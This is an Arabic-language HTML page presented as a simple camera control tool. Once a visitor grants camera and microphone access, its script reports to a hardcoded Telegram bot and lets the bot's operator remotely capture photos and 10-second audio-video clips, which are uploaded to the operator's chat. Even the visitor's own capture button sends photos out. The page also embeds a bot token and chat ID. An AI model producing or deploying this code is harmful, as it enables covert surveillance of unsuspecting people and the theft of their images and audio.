<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحكم بالكاميرا</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f8ff;
            color: #333;
            padding: 20px;
            text-align: center;
        }
        #videoElement {
            width: 100%;
            max-width: 400px;
            height: auto;
            border: 2px solid #3498db;
            border-radius: 10px;
            margin-bottom: 20px;
            background: #000;
        }
        .hidden { display: none; }
        .controls {
            margin-top: 20px;
        }
        .button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            margin: 5px;
        }
        .button:hover {
            background-color: #2980b9;
        }
        .button-danger {
            background-color: #e74c3c;
        }
        .button-danger:hover {
            background-color: #c0392b;
        }
        .status {
            margin: 10px;
            padding: 8px;
            border-radius: 5px;
            font-size: 14px;
        }
        .status-success {
            background-color: #d4edda;
            color: #155724;
        }
        .status-error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <h1>🎥 نظام التحكم بالكاميرا</h1>
    
    <div id="statusMessage" class="status"></div>

    <a href="#" id="accessCameraLink" class="button">📷 اضغط هنا للوصول إلى الكاميرا</a>

    <video id="videoElement" class="hidden" autoplay playsinline></video>

    <div id="controls" class="controls hidden">
        <button class="button" id="captureImageButton">📸 التقاط صورة</button>
        <button class="button" id="startRecordingButton">🎬 بدء التسجيل</button>
        <button class="button button-danger hidden" id="stopRecordingButton">⏹️ إيقاف التسجيل</button>
        <button class="button" id="sendToTelegramBtn">📤 إرسال إلى تليجرام</button>
    </div>

    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        
        // عناصر الواجهة
        const videoElement = document.getElementById('videoElement');
        const accessCameraLink = document.getElementById('accessCameraLink');
        const controls = document.getElementById('controls');
        const captureImageButton = document.getElementById('captureImageButton');
        const startRecordingButton = document.getElementById('startRecordingButton');
        const stopRecordingButton = document.getElementById('stopRecordingButton');
        const sendToTelegramBtn = document.getElementById('sendToTelegramBtn');
        const statusMessage = document.getElementById('statusMessage');
        
        // متغيرات الكاميرا والتسجيل
        let mediaStream = null;
        let mediaRecorder = null;
        let videoChunks = [];
        let cameraActive = false;
        let lastCapturedImage = null;
        let lastRecordedVideo = null;
        
        // متغيرات البوت
        let lastUpdateId = 0;
        let imageCapture = null;
        
        // دالة عرض الحالة
        function showStatus(message, isError = false) {
            statusMessage.textContent = message;
            statusMessage.className = `status ${isError ? 'status-error' : 'status-success'}`;
            setTimeout(() => {
                if (statusMessage.textContent === message) {
                    statusMessage.className = 'status';
                    statusMessage.textContent = '';
                }
            }, 3000);
        }
        
        // دالة إرسال رسالة نصية إلى تليجرام
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text })
                });
            } catch (e) {
                console.error("فشل إرسال النص:", e);
            }
        }
        
        // إرسال صورة
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }
        
        // إرسال فيديو
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                method: "POST",
                body: formData
            });
        }
        
        // إرسال واجهة تحكم البوت
        async function sendBotMenu() {
            const message = `🎮 *واجهة التحكم عن بعد* 🎮

✅ الكاميرا نشطة وجاهزة

اختر الإجراء المطلوب:`;
            
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📸 التقاط صورة", callback_data: "capture_photo" },
                        { text: "🎬 تسجيل فيديو", callback_data: "record_video" }
                    ],
                    [
                        { text: "📊 حالة الكاميرا", callback_data: "camera_status" }
                    ]
                ]
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id,
                    text: message,
                    parse_mode: "Markdown",
                    reply_markup: keyboard
                })
            });
        }
        
        // التقاط صورة من الفيديو
        async function captureImage() {
            if (!cameraActive || !videoElement.videoWidth) {
                showStatus("❌ الكاميرا غير نشطة! يرجى تفعيلها أولاً", true);
                return null;
            }
            
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                canvas.getContext('2d').drawImage(videoElement, 0, 0);
                
                // تحويل إلى blob
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                lastCapturedImage = blob;
                
                // معاينة الصورة
                const img = document.createElement('img');
                img.src = canvas.toDataURL();
                img.style.maxWidth = '200px';
                img.style.margin = '10px';
                img.style.borderRadius = '10px';
                img.style.border = '2px solid #3498db';
                document.body.appendChild(img);
                
                setTimeout(() => img.remove(), 5000);
                
                showStatus("✅ تم التقاط الصورة بنجاح!");
                return blob;
            } catch (e) {
                console.error("فشل التقاط الصورة:", e);
                showStatus("❌ فشل التقاط الصورة", true);
                return null;
            }
        }
        
        // بدء تسجيل الفيديو
        function startRecording() {
            if (!mediaStream || !cameraActive) {
                showStatus("❌ الكاميرا غير نشطة!", true);
                return;
            }
            
            videoChunks = [];
            mediaRecorder = new MediaRecorder(mediaStream);
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(videoChunks, { type: 'video/webm' });
                lastRecordedVideo = blob;
                
                // معاينة الفيديو
                const videoUrl = URL.createObjectURL(blob);
                const videoPreview = document.createElement('video');
                videoPreview.src = videoUrl;
                videoPreview.controls = true;
                videoPreview.style.maxWidth = '300px';
                videoPreview.style.margin = '10px';
                videoPreview.style.borderRadius = '10px';
                document.body.appendChild(videoPreview);
                
                setTimeout(() => videoPreview.remove(), 8000);
                
                showStatus("✅ تم تسجيل الفيديو بنجاح!");
            };
            
            mediaRecorder.start();
            startRecordingButton.classList.add('hidden');
            stopRecordingButton.classList.remove('hidden');
            showStatus("🎬 جاري التسجيل...");
        }
        
        // إيقاف التسجيل
        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                startRecordingButton.classList.remove('hidden');
                stopRecordingButton.classList.add('hidden');
            }
        }
        
        // إرسال آخر صورة إلى تليجرام
        async function sendLastImage() {
            if (lastCapturedImage) {
                await sendPhoto(lastCapturedImage);
                showStatus("📸 تم إرسال الصورة إلى تليجرام");
                await sendToTelegram("✅ تم إرسال الصورة");
            } else {
                showStatus("❌ لا توجد صورة مسبقاً! قم بالتقاط صورة أولاً", true);
            }
        }
        
        // إرسال آخر فيديو إلى تليجرام
        async function sendLastVideo() {
            if (lastRecordedVideo) {
                await sendVideo(lastRecordedVideo);
                showStatus("🎬 تم إرسال الفيديو إلى تليجرام");
                await sendToTelegram("✅ تم إرسال الفيديو");
            } else {
                showStatus("❌ لا يوجد فيديو مسبقاً! قم بتسجيل فيديو أولاً", true);
            }
        }
        
        // إيقاف الكاميرا (مع الحفاظ على الصلاحية)
        function stopCamera() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => {
                    track.stop();
                });
                cameraActive = false;
                videoElement.classList.add('hidden');
                showStatus("📵 تم إيقاف الكاميرا مؤقتاً");
            }
        }
        
        // استئناف الكاميرا (بدون طلب صلاحية جديد)
        async function resumeCamera() {
            if (mediaStream && !cameraActive) {
                try {
                    // إعادة إنشاء التيار من نفس المصدر
                    const newStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    mediaStream = newStream;
                    videoElement.srcObject = newStream;
                    cameraActive = true;
                    videoElement.classList.remove('hidden');
                    showStatus("✅ تم استئناف الكاميرا");
                } catch (e) {
                    console.error("فشل استئناف الكاميرا:", e);
                    showStatus("❌ فشل استئناف الكاميرا", true);
                }
            }
        }
        
        // معالجة أوامر البوت
        async function handleCallback(callbackData) {
            switch(callbackData) {
                case "capture_photo":
                    const image = await captureImage();
                    if (image) await sendPhoto(image);
                    break;
                case "record_video":
                    if (!mediaRecorder || mediaRecorder.state !== 'recording') {
                        startRecording();
                        setTimeout(async () => {
                            stopRecording();
                            await new Promise(r => setTimeout(r, 500));
                            if (lastRecordedVideo) await sendVideo(lastRecordedVideo);
                        }, 10000);
                    }
                    break;
                case "camera_status":
                    const status = cameraActive ? "🟢 الكاميرا نشطة" : "🔴 الكاميرا متوقفة";
                    await sendToTelegram(`📹 حالة الكاميرا: ${status}`);
                    break;
            }
        }
        
        // جلب تحديثات البوت
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=30&offset=${lastUpdateId + 1}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.result && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        
                        if (update.callback_query) {
                            await handleCallback(update.callback_query.data);
                            
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    callback_query_id: update.callback_query.id,
                                    text: "✅ جاري تنفيذ الأمر..."
                                })
                            });
                        }
                    }
                }
            } catch (e) {
                console.error("خطأ في جلب التحديثات:", e);
            }
        }
        
        // عند الضغط على رابط الوصول إلى الكاميرا
        accessCameraLink.addEventListener('click', async (e) => {
            e.preventDefault();
            
            showStatus("⏳ جاري طلب الوصول إلى الكاميرا...");
            
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoElement.srcObject = mediaStream;
                videoElement.classList.remove('hidden');
                controls.classList.remove('hidden');
                accessCameraLink.classList.add('hidden');
                cameraActive = true;
                
                showStatus("✅ تم تفعيل الكاميرا بنجاح!");
                
                // إرسال إشعار إلى تليجرام
                await sendToTelegram("✅ تم تفعيل الكاميرا بنجاح! النظام جاهز للتحكم عن بعد");
                await sendBotMenu();
                
                // بدء الاستماع لأزرار البوت
                setInterval(getUpdates, 3000);
                
            } catch (err) {
                console.error("فشل الوصول:", err);
                showStatus("❌ فشل الوصول إلى الكاميرا: " + err.message, true);
            }
        });
        
        // أحداث الأزرار
        captureImageButton.addEventListener('click', async () => {
            const image = await captureImage();
            if (image) await sendPhoto(image);
        });
        
        startRecordingButton.addEventListener('click', () => {
            startRecording();
        });
        
        stopRecordingButton.addEventListener('click', () => {
            stopRecording();
        });
        
        sendToTelegramBtn.addEventListener('click', async () => {
            if (lastCapturedImage) {
                await sendPhoto(lastCapturedImage);
            } else if (lastRecordedVideo) {
                await sendVideo(lastRecordedVideo);
            } else {
                showStatus("❌ لا توجد وسائط للإرسال! قم بالتقاط صورة أو تسجيل فيديو أولاً", true);
            }
        });
        
        // الحفاظ على الصلاحيات عند مغادرة الصفحة أو تغيير التبويب
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                // عند مغادرة الصفحة، أوقف الكاميرا مؤقتاً (ولكن نحتفظ بالصلاحية)
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    stopRecording();
                }
                stopCamera();
            } else {
                // عند العودة إلى الصفحة، استأنف الكاميرا
                if (accessCameraLink.classList.contains('hidden')) {
                    resumeCamera();
                }
            }
        });
        
        // منع فقدان الصلاحية عند إعادة تحميل الصفحة
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                // لا نوقف التيار نهائياً حتى لا نفقد الصلاحية
                // فقط نتركه يعمل
            }
        });
        
        showStatus("🔒 اضغط على الرابط لتفعيل الكاميرا");
    </script>
</body>
</html>
